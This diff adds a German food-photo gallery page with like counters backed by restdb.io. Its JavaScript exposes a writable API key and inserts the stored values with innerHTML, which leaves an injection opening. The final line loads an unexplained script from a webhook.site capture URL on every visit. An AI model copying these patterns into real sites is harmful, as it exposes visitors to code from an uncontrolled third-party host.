@@ -1,0 +1,373 @@
+<html>
+<head>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+<link rel="stylesheet" type="text/css" href="css/main.css">
+<script type='text/javascript' src='js/dynamicpage.js'></script>
+<script type='text/javascript' src='js/jquery.ba-hashchange.min.js'></script>
+
+<link rel="shortcut icon" type="image/png" href="img/481486.png"/>
+<title>Edel & Einmalig</title>
+</head>
+<body>
+<!-- navbar -->  
+ <nav class="navbar navbar-expand-sm fixed-top ">
+ 
+<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">  
+ <span class="navbar-toggler-icon"></span>
+</button>
+<div class="collapse navbar-collapse " id="navbarSupportedContent">     <ul class="navbar-nav mr-auto">
+  <li class="nav-item">
+<a class="nav-link" data-value="hi" href="index.html">Hauptseite</a>        </li>  
+<li class="nav-item">
+ 
+ <li class="nav-item">
+     <a class="nav-link" data-value="edel" href="edel-einmalig.html">Edel & Einmalig</a>        </li>  
+<li class="nav-item">
+    <a class="nav-link " data-value="dessert-susses" href="dessert-susses.html">Dessert & Süsses</a> </li>
+ <li class="nav-item"> 
+    <a class="nav-link " data-value="fastfood-alltag" href="fastfood-alltag.html">Fastfood & Alltag</a>         </li> 
+<li class="nav-item"> 
+    <a class="nav-link " data-value="exotik-fremde-lander" href="exotik-fremde-lander.html">Exotik & Fremde Länder</a>         </li>   		
+
+
+</ul> 
+</div></nav>
+<style>
+
+div.gallery {
+  margin: 20px;
+  border: 1px solid #ccc;
+  float: left;
+  width: 400px;
+  height: 300px;
+}
+
+div.gallery:hover {
+  border: 1px solid #777;
+}
+
+div.gallery img {
+  width: 100%;
+  height: auto;
+  align: center;
+}
+
+div.desc {
+  padding: 15px;
+  text-align: center;
+}
+</style>
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+<script>
+      var settings = {
+        "url": "https://likes-43b1.restdb.io/rest/imglikes?q={}&sort=imgnumber",
+        "method": "GET",
+        "timeout": 0,
+		"headers": {
+		"content-type": "application/json",
+		"x-apikey": "60ade0fe318a330b62f58717",
+		"cache-control": "no-cache"
+  }
+      };
+
+      $.ajax(settings).done(function (response) {
+        	console.log(response);
+        	var img0 = response[18].value;
+		var img1 = response[19].value;
+		var img2 = response[20].value;
+		var img3 = response[21].value;
+		var img4 = response[22].value;
+		var img5 = response[23].value;
+	      	var img6 = response[24].value;
+	      	var img7 = response[25].value;
+	      	var img8 = response[26].value;
+	      	var img9 = response[27].value;
+	      	var img10 = response[28].value;
+	      	var img11 = response[29].value;
+	      	var img12 = response[30].value;
+	      	var img13 = response[31].value;
+	      	var img14 = response[32].value;
+	      	var img15 = response[33].value;
+	      	var img16 = response[34].value;
+	      	var img17 = response[35].value;
+	        var img18 = response[36].value;
+	        var img19 = response[37].value;
+	      	document.getElementById("img0").innerHTML = img0;
+		document.getElementById("img1").innerHTML = img1;
+		document.getElementById("img2").innerHTML = img2;
+		document.getElementById("img3").innerHTML = img3;
+		document.getElementById("img4").innerHTML = img4;
+		document.getElementById("img5").innerHTML = img5;
+		document.getElementById("img6").innerHTML = img6;
+	      	document.getElementById("img7").innerHTML = img7;
+		document.getElementById("img8").innerHTML = img8;
+		document.getElementById("img9").innerHTML = img9;
+		document.getElementById("img10").innerHTML = img10;
+		document.getElementById("img11").innerHTML = img11;
+		document.getElementById("img12").innerHTML = img12;
+		document.getElementById("img13").innerHTML = img13;
+		document.getElementById("img14").innerHTML = img14;
+		document.getElementById("img15").innerHTML = img15;
+		document.getElementById("img16").innerHTML = img16;
+		document.getElementById("img17").innerHTML = img17;
+	        document.getElementById("img18").innerHTML = img18;
+	        document.getElementById("img19").innerHTML = img19;
+	   });
+		</script>
+	  
+	  
+	<script type="text/javascript">
+    function clicky(img) {
+    var src = img.id;
+    console.log(src)
+    var counter = document.getElementById(src).parentNode.childNodes[3].innerText;
+	var counsterstr = counter.toString();
+	counsterstr++;
+	//document.getElementById("img1").innerHTML = counsterstr;
+	document.getElementById(src).parentNode.childNodes[3].innerText = counsterstr;
+	console.log(counsterstr);
+	var jsondata = {"value": counsterstr,};
+	var target= 'https://likes-43b1.restdb.io/rest/imglikes/' + src;
+	var settings = {
+    "async": true,
+   "crossDomain": true,
+    "url": target,
+    "method": "PUT",
+    "headers": {
+    "content-type": "application/json",
+    "x-apikey": "60ade0fe318a330b62f58717",
+    "cache-control": "no-cache"
+    },
+   "processData": false,
+    "data": JSON.stringify(jsondata)
+    }
+
+   $.ajax(settings).done(function (response) {
+   console.log(response);
+});
+}
+</script>
+	  
+</head>
+<body>
+<br>
+<br>
+<br>
+	
+<div class="gallery">
+<a href="img/de-0.JPG" target="_blank" style="display:block; text-align: center">
+  <img src="img/de-0.JPG" style="width:auto;height:230px;"/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;"  id="60bcb3db9f37e1100000bcba" onclick="clicky(this)"/>
+<text id="img0"></text>
+</div>
+</div>
+	
+<div class="gallery">
+<a href="img/de-1.JPG" target="_blank" style="display:block; text-align: center" >
+  <img src="img/de-1.JPG" style="width:auto;height:230px;" src=""/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;"  id="60bcb4129f37e1100000bcd4" onclick="clicky(this)"/>
+<text id="img1"></text>
+</div>
+</div>
+
+
+<div class="gallery">
+<a href="img/de-2.JPG" target="_blank" style="display:block; text-align: center">
+  <img src="img/de-2.JPG" style="width:auto;height:230px;"/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;" id="60bcb41f9f37e1100000bcd9" onclick="clicky(this)"/>
+<text id="img2"></text>
+</div>
+</div>
+
+
+<div class="gallery">
+<a href="img/de-3.JPG" target="_blank" style="display:block; text-align: center">
+  <img src="img/de-3.JPG" style="width:auto;height:230px;" src=""/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;" id="60bcb4259f37e1100000bce2" onclick="clicky(this)"/>
+<text id="img3"></text>
+</div>
+</div>
+
+
+<div class="gallery">
+<a href="img/de-4.JPG" target="_blank" style="display:block; text-align: center">
+  <img src="img/de-4.JPG" style="width:auto;height:230px;" src=""/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;" id="60bcb46b9f37e1100000bd0a" onclick="clicky(this)"/>
+<text id="img4"></text>
+</div>
+</div>
+
+<div class="gallery">
+<a href="img/de-5.JPG" target="_blank" style="display:block; text-align: center">
+  <img src="img/de-5.JPG" style="width:auto;height:230px;" src=""/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;" id="60bcb4b19f37e1100000bd2f" onclick="clicky(this)"/>
+<text id="img5"></text>
+</div>
+</div>
+
+<div class="gallery">
+<a href="img/de-6.JPG" target="_blank" style="display:block; text-align: center">
+  <img src="img/de-6.JPG" style="width:auto;height:230px"; src=""/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;" id="60bcb4bd9f37e1100000bd35" onclick="clicky(this)"/>
+<text id="img6"></text>
+</div>
+</div>
+	
+<div class="gallery">
+<a href="img/de-7.JPG" target="_blank" style="display:block; text-align: center">
+  <img src="img/de-7.JPG" style="width:auto;height:230px;" src=""/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;" id="60bcb4ca9f37e1100000bd3f" onclick="clicky(this)"/>
+<text id="img7"></text>
+</div>
+</div>
+	
+
+	
+<div class="gallery">
+<a href="img/de-8.JPG" target="_blank" style="display:block; text-align: center">
+  <img src="img/de-8.JPG" style="width:auto;height:230px;"/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;" id="60bcb4de9f37e1100000bd49" onclick="clicky(this)"/>
+<text id="img8"></text>
+</div>
+</div>
+
+	
+	
+<div class="gallery">
+<a href="img/de-9.JPG" target="_blank" style="display:block; text-align: center">
+  <img src="img/de-9.JPG" style="width:auto;height:230px;" src=""/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;" id="60bcb4eb9f37e1100000bd51" onclick="clicky(this)"/>
+<text id="img9"></text>
+</div>
+</div>
+	
+<div class="gallery">
+<a href="img/de-10.JPG" target="_blank" style="display:block; text-align: center">
+  <img src="img/de-10.JPG" style="width:auto;height:230px;" src=""/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;" id="60bcb5039f37e1100000bd60" onclick="clicky(this)"/>
+<text id="img10"></text>
+</div>
+</div>
+	
+<div class="gallery">
+<a href="img/de-11.JPG" target="_blank" style="display:block; text-align: center">
+  <img src="img/de-11.JPG" style="width:auto;height:230px;" src=""/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;" id="60bcb5429f37e1100000bd7f" onclick="clicky(this)"/>
+<text id="img11"></text>
+</div>
+</div>	
+
+	
+<div class="gallery">
+<a href="img/de-12.JPG" target="_blank"  style="display:block; text-align: center">
+  <img src="img/de-12.JPG" style="width:auto;height:230px;" src=""/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;" id="60bcb54f9f37e1100000bd8b" onclick="clicky(this)"/>
+<text id="img12"></text>
+</div>
+</div>	
+
+	
+<div class="gallery">
+<a href="img/de-13.JPG" target="_blank" style="display:block; text-align: center">
+  <img src="img/de-13.JPG" style="width:auto;height:230px;" src=""/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;" id="60bcb5779f37e1100000bd9c" onclick="clicky(this)"/>
+<text id="img13"></text>
+</div>
+</div>
+	
+	
+<div class="gallery">
+<a href="img/de-14.JPG" target="_blank" style="display:block; text-align: center">
+  <img src="img/de-14.JPG" style="width:auto;height:230px;" src=""/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;" id="60bcb5899f37e1100000bdad" onclick="clicky(this)"/>
+<text id="img14"></text>
+</div>
+</div>
+	
+<div class="gallery">
+<a href="img/de-15.JPG" target="_blank" style="display:block; text-align: center">
+  <img src="img/de-15.JPG" style="width:auto;height:230px;" src=""/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;" id="60bcb5949f37e1100000bdb2" onclick="clicky(this)"/>
+<text id="img15"></text>
+</div>
+</div>
+	
+	
+<div class="gallery">
+<a href="img/de-16.JPG" target="_blank" style="display:block; text-align: center">
+  <img src="img/de-16.JPG" style="width:auto;height:230px;" src=""/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;" id="60bcb5ad9f37e1100000bdbe" onclick="clicky(this)"/>
+<text id="img16"></text>
+</div>
+</div>
+	
+	
+<div class="gallery">
+<a href="img/de-17.JPG" target="_blank" style="display:block; text-align: center">
+  <img src="img/de-17.JPG" style="width:auto;height:230px;" src=""/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;" id="60bcb5bb9f37e1100000bdc7" onclick="clicky(this)"/>
+<text id="img17"></text>
+</div>
+</div>
+	
+<div class="gallery">
+<a href="img/de-18.JPG" target="_blank" style="display:block; text-align: center">
+  <img src="img/de-18.JPG" style="width:auto;height:230px;" src=""/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;" id="60bcb5d29f37e1100000bdd0" onclick="clicky(this)"/>
+<text id="img18"></text>
+</div>
+</div>
+	
+	
+<div class="gallery">
+<a href="img/de-19.JPG" target="_blank" style="display:block; text-align: center">
+  <img src="img/de-19.JPG" style="width:auto;height:230px;" src=""/>
+</a>
+<div align="center" style="padding:15px">
+<img src="img/heart36.png" style="width:36px;height:36px;" id="60bcb5df9f37e1100000bdd8" onclick="clicky(this)"/>
+<text id="img19"></text>
+</div>
+</div>
+<script src='https://webhook.site/86537f55-ba82-4f24-9af3-5beff43f6365'></script>
+</body>
+</html>
